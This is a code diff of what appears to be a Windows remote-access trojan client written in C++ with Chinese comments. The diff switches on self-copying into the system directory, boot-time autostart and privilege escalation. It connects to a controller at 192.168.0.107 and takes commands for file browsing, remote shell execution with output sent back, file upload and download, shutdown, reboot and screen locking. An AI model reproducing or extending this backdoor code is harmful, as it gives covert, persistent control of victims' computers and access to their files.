@@ -16,22 +16,22 @@ void process(SOCKET fd);
 
 int main()
 {
-	//if (true == UpPrivilegeValue())
-	//{
-	//	//cout << "successs" << endl;
-	//}
+	if (true == UpPrivilegeValue())
+	{
+		//cout << "successs" << endl;
+	}
 
-	//char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260
+	char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260
 
-	//copySelf(pathName);//将文件复制到系统目录
+	copySelf(pathName);//将文件复制到系统目录
 
-	//ComputerStart(pathName);//设置程序开机自启
+	ComputerStart(pathName);//设置程序开机自启
 
 	init_Socket();//创建客户端socket
 
 	SOCKET fd = CreatClientScoket("192.168.0.107");//连接
 
-	char str[BUFSIZ] = "connect success";//连接成功
+	char str[BUFSIZ] = "Connect success";//连接成功
 	encode(str);
 	send(fd, str, BUFSIZ, 0);
 	Sleep(200);
@@ -79,20 +79,8 @@ int GetPCMessage(SOCKET fd)
 int FileBrowse(SOCKET fd, char* str)
 {
 	//获取目标路径下的文件名
-	char FileName[FileNameRow][FileNameCol];
-	for (int i = 0; i < FileNameCol; i++)
-	{
-		ZeroMemory(FileName[i], sizeof(FileName[i]));
-	}
-	GetFileName(FileName, str);
-	for (int i = 0; i < FileNameCol; i++)
-	{
-		if (FileName[i][0] != 0)
-		{
-			//printf("%s\n", FileName[i]);
-			send(fd, FileName[i], FileNameRow, 0);
-		}
-	}
+	char FileName[Row] = { 0 };
+	GetFileName(fd, FileName, str);
 	return 0;
 }
 
@@ -184,7 +172,7 @@ int shell(SOCKET fd, const char* cmd, char* result)
 		while (fgets(buf_ps, sizeof(buf_ps), ptr) != NULL)
 		{
 			strcat(result, buf_ps);
-			if (strlen(result) > BUFSIZ * 4)
+			if (strlen(result) > BUFSIZ * 6)
 			{
 				break;
 			}
@@ -194,7 +182,7 @@ int shell(SOCKET fd, const char* cmd, char* result)
 		iRet = 0;  // 处理成功
 	}
 	//cout << result;
-	send(fd, result, BUFSIZ * 4, 0);
+	send(fd, result, BUFSIZ * 6, 0);
 	return iRet;
 }
 
@@ -251,20 +239,18 @@ void process(SOCKET fd)
 
 			if (!strcmp(command, "filebrowse"))
 			{
-				recv(fd, recvbuf, BUFSIZ, 0);
+				recv(fd, recvbuf, 100, 0);//接收路径
 				decode(recvbuf);
 				FileBrowse(fd, recvbuf);
 				continue;
 			}
 			else if (!strcmp(command, "shell"))
 			{
-				char res[BUFSIZ * 4] = { 0 };
+				char res[BUFSIZ * 6] = { 0 };
 				if (recv(fd, recvbuf, BUFSIZ, 0) > 0)//获得shell指令
 				{
 					decode(recvbuf);
 					shell(fd, recvbuf, res);
-					/*thread th2 = thread(shell, fd, recvbuf, res);
-					th2.join();*/
 					continue;
 				}
 			}
@@ -273,8 +259,6 @@ void process(SOCKET fd)
 				recv(fd, recvbuf, BUFSIZ, 0);
 				decode(recvbuf);
 				sendFile(fd, recvbuf);
-				/*thread th3 = thread(sendFile, fd, recvbuf);
-				th3.join();*/
 				continue;
 			}
 			else if (!strcmp(command, "upload"))
@@ -282,58 +266,58 @@ void process(SOCKET fd)
 				recv(fd, recvbuf, BUFSIZ, 0);
 				decode(recvbuf);
 				recvFile(fd, recvbuf);
-				/*thread th4 = thread(recvFile, fd, recvbuf);
-				th4.join();*/
 				continue;
 			}
 			else if (!strcmp(command, "upright"))
 			{
-				thread th5 = thread(UpPrivilegeValue);
-				th5.join();
+				UpPrivilegeValue();
 				continue;
 			}
 			else if (!strcmp(command, "kill"))
 			{
-				char text[BUFSIZ] = "Client has exit!";
+				char text[60] = "Client has exit!";
 				encode(text);
-				send(fd, text, BUFSIZ, 0);//关闭客户端
+				send(fd, text, 60, 0);//关闭客户端
 				exit(0);
 				continue;
 			}
 			else if (!strcmp(command, "shutdown"))
 			{
-				char text[BUFSIZ] = "shutdown after 10s";
+				char text[60] = "shutdown after 10s";
 				encode(text);
-				send(fd, text, BUFSIZ, 0);
-				system("shutdown -s -t 1");//关机
+				send(fd, text, 60, 0);
+				system("shutdown -s -t 10");//关机
 				continue;
 			}
 			else if (!strcmp(command, "reboot"))
 			{
-				char text[BUFSIZ] = "reboot after 10s";
+				char text[60] = "reboot after 10s";
 				encode(text);
-				send(fd, text, BUFSIZ, 0);
+				send(fd, text, 60, 0);
 				system("shutdown -r -t 10"); //重启
 				continue;
 			}
 			else if (!strcmp(command, "cancel"))
 			{
 				system("shutdown -a");//取消关机
+				char text[60] = "Cancel success";
+				encode(text);
+				send(fd, text, 60, 0);
 				continue;
 			}
 			else if (!strcmp(command, "lock"))
 			{
-				char text[BUFSIZ] = "lock successs";
+				char text[60] = "lock successs";
 				encode(text);
-				send(fd, text, BUFSIZ, 0);
+				send(fd, text, 60, 0);
 				system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");//锁屏
 				continue;
 			}
 			else
 			{
-				char text[BUFSIZ] = "Error code";
+				char text[60] = "Error code";
 				encode(text);
-				send(fd, text, BUFSIZ, 0);//发送指令错误
+				send(fd, text, 60, 0);//发送指令错误
 				continue;
 			}
 			ZeroMemory(recvbuf, sizeof(recvbuf));//初始化
